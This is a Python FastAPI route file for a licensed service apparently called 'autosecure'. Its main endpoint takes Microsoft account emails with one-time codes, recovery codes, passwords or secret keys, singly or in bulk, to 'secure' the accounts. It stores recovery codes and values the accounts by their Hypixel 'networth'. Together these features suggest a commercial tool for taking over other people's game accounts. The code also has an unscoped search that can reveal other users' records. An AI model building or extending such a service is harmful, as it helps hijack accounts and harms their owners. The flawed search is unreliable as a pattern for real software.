"""Account management routes."""

from __future__ import annotations

import math
from fastapi import APIRouter, HTTPException, Query
from pydantic import BaseModel
from typing import Literal

from autosecure.api.models.accounts import AccountCreate, AccountListResponse, AccountResponse
from autosecure.core.deps import CurrentUser, DBSession, LicensedUser
from autosecure.db.accounts import AccountRepo
from autosecure.services.hypixel import get_player_stats

router = APIRouter(prefix="/accounts", tags=["accounts"])


class SecureRequest(BaseModel):
    secure_type: Literal["otp", "recovery", "bulk", "zyger", "own_email"]
    email: str | None = None
    otp: str | None = None
    recovery_code: str | None = None
    password: str | None = None
    secret_key: str | None = None
    username: str | None = None
    accounts_text: str | None = None
    target_emails_text: str | None = None
    own_email: str | None = None
    own_password: str | None = None


class SecureResultResponse(BaseModel):
    success: bool
    method: str
    account_data: dict = {}
    error: str = ""
    results: list[dict] | None = None


@router.post("/secure", response_model=SecureResultResponse)
async def secure_account(
    body: SecureRequest,
    user_id: LicensedUser,
    db: DBSession,
) -> SecureResultResponse:
    """Secure a Microsoft account using the specified method.

    Requires an active license.
    """
    from autosecure.services.securing.otp import otp_secure
    from autosecure.services.securing.recovery import recovery_secure
    from autosecure.services.securing.bulk import bulk_secure
    from autosecure.services.securing.zyger import zyger_secure
    from autosecure.services.securing.own import own_secure

    secure_type = body.secure_type

    if secure_type == "otp":
        if not body.email or not body.otp:
            raise HTTPException(status_code=422, detail="email and otp are required for OTP securing")
        result = await otp_secure(
            email=body.email,
            otp=body.otp,
            username=body.username,
            user_id=user_id,
            db=db,
        )
        return SecureResultResponse(
            success=result.success,
            method=result.method,
            account_data=result.account_data,
            error=result.error,
        )

    if secure_type == "recovery":
        if not body.email or not body.recovery_code:
            raise HTTPException(status_code=422, detail="email and recovery_code are required for recovery securing")
        result = await recovery_secure(
            email=body.email,
            recovery_code=body.recovery_code,
            username=body.username,
            user_id=user_id,
            db=db,
        )
        return SecureResultResponse(
            success=result.success,
            method=result.method,
            account_data=result.account_data,
            error=result.error,
        )

    if secure_type == "zyger":
        if not body.email or not body.password or not body.secret_key:
            raise HTTPException(status_code=422, detail="email, password, and secret_key are required for zyger securing")
        result = await zyger_secure(
            email=body.email,
            password=body.password,
            secret_key=body.secret_key,
            username=body.username,
            user_id=user_id,
            db=db,
        )
        return SecureResultResponse(
            success=result.success,
            method=result.method,
            account_data=result.account_data,
            error=result.error,
        )

    if secure_type == "own_email":
        if not body.email or not body.recovery_code:
            raise HTTPException(status_code=422, detail="email and recovery_code are required for own_email securing")
        result = await own_secure(
            email=body.email,
            recovery_code=body.recovery_code,
            own_email=body.own_email,
            own_password=body.own_password,
            user_id=user_id,
            db=db,
        )
        return SecureResultResponse(
            success=result.success,
            method=result.method,
            account_data=result.account_data,
            error=result.error,
        )

    if secure_type == "bulk":
        if not body.accounts_text:
            raise HTTPException(status_code=422, detail="accounts_text is required for bulk securing")
        results = await bulk_secure(
            accounts_text=body.accounts_text,
            target_emails_text=body.target_emails_text or "",
            user_id=user_id,
            db=db,
        )
        return SecureResultResponse(
            success=True,
            method="bulk",
            results=[{
                "success": r.success,
                "error": r.error,
                "account_data": r.account_data,
            } for r in results],
        )

    raise HTTPException(status_code=400, detail=f"Unknown secure type: {secure_type}")


@router.get("", response_model=AccountListResponse)
async def list_accounts(
    user_id: CurrentUser,
    db: DBSession,
    page: int = Query(1, ge=1),
    per_page: int = Query(25, ge=1, le=100),
    search: str | None = Query(None),
) -> AccountListResponse:
    """List accounts for the authenticated user with pagination and search."""
    repo = AccountRepo(db)
    offset = (page - 1) * per_page

    if search:
        accounts = await repo.search(search, limit=per_page)
    else:
        accounts = await repo.get_by_user(user_id, limit=per_page, offset=offset)

    total = await repo.count_by_user(user_id)
    pages = math.ceil(total / per_page) if total else 0

    return AccountListResponse(
        accounts=[
            AccountResponse(
                uid=a.uid,
                username=a.username,
                email=a.email,
                networth=a.stats.get("networth") if a.stats else None,
                created_at=a.created_at,
            )
            for a in accounts
        ],
        total=total,
        page=page,
        pages=pages,
    )


@router.get("/{uid}", response_model=AccountResponse)
async def get_account(uid: str, user_id: CurrentUser, db: DBSession) -> AccountResponse:
    """Get a single account by UID."""
    repo = AccountRepo(db)
    data = await repo.get_account_with_user(uid)
    if data is None:
        raise HTTPException(status_code=404, detail="Account not found")

    account = data["account"]
    mapping = data["mapping"]
    if mapping.user_id != user_id:
        raise HTTPException(status_code=403, detail="Access denied")

    return AccountResponse(
        uid=account.uid,
        username=account.username,
        email=account.email,
        networth=account.stats.get("networth") if account.stats else None,
        created_at=account.created_at,
    )


@router.post("", response_model=AccountResponse, status_code=201)
async def create_account(
    body: AccountCreate,
    user_id: CurrentUser,
    db: DBSession,
) -> AccountResponse:
    """Register a new account."""
    repo = AccountRepo(db)
    account = await repo.insert(
        {
            "uid": body.uid,
            "user_id": user_id,
            "username": body.username,
            "email": body.email,
            "recovery_code": body.recovery_code,
        }
    )
    return AccountResponse(
        uid=account.uid,
        username=account.username,
        email=account.email,
        created_at=account.created_at,
    )


@router.delete("/{uid}")
async def delete_account(uid: str, user_id: CurrentUser, db: DBSession) -> dict[str, str]:
    """Delete an account by UID."""
    repo = AccountRepo(db)
    data = await repo.get_account_with_user(uid)
    if data is None:
        raise HTTPException(status_code=404, detail="Account not found")
    if data["mapping"].user_id != user_id:
        raise HTTPException(status_code=403, detail="Access denied")
    deleted = await repo.delete_by_uid(uid)
    if not deleted:
        raise HTTPException(status_code=404, detail="Account not found")
    return {"success": True, "message": "Account deleted"}


@router.get("/{uid}/stats")
async def get_account_stats(uid: str, user_id: CurrentUser, db: DBSession) -> dict:
    """Fetch Hypixel stats for an account."""
    repo = AccountRepo(db)
    data = await repo.get_account_with_user(uid)
    if data is None:
        raise HTTPException(status_code=404, detail="Account not found")
    if data["mapping"].user_id != user_id:
        raise HTTPException(status_code=403, detail="Access denied")

    stats = await get_player_stats(data["account"].username)
    return {"uid": uid, "stats": stats}
